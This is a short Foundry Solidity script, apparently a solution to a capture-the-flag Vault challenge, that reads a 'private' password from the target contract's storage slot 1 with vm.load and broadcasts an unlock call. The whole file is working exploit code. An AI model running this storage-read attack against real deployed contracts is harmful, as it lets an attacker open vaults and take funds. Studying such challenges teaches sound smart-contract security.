// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultScript is Script {
    Vault public vault;
    address target = 0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08;

    function setUp() public {
        vault = Vault(target);
    }

    function run() public {
        vm.startBroadcast();

        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);

        assert(!vault.locked());

        vm.stopBroadcast();
    }
}
